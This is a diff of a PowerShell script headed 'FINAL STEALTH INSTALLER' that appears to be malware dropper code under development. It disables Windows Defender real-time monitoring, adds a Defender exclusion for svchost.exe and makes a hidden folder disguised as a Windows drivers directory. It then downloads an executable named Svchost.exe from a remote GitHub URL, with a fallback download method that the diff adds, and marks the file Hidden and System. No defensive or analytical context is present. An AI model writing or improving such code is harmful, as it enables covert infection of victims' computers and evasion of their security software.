@@ -1,5 +1,5 @@
 # ============================================
-# STEALTH INSTALLER - No Edge Required
+# FINAL STEALTH INSTALLER
 # ============================================
 
 # ============================================
@@ -17,9 +17,8 @@ Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
 # ============================================
-# STAGE 3: HIDDEN FOLDER (Har PC mein hai)
+# STAGE 3: HIDDEN FOLDER
 # ============================================
-# Option 1: Windows Driver Folder (Always exists)
 $HiddenFolder = "$env:ProgramData\Microsoft\Windows\Drivers"
 if (!(Test-Path $HiddenFolder)) {
     New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null
@@ -33,9 +32,13 @@ $ExePath = Join-Path $HiddenFolder $RandomName
 # STAGE 4: DOWNLOAD EXE
 # ============================================
 $DownloadUrl = "https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe"
-$wc = New-Object System.Net.WebClient
-$wc.Headers.Add("User-Agent", "Mozilla/5.0")
-$wc.DownloadFile($DownloadUrl, $ExePath)
+try {
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+    $wc.DownloadFile($DownloadUrl, $ExePath)
+} catch {
+    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing
+}
 Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"
 
 # ============================================
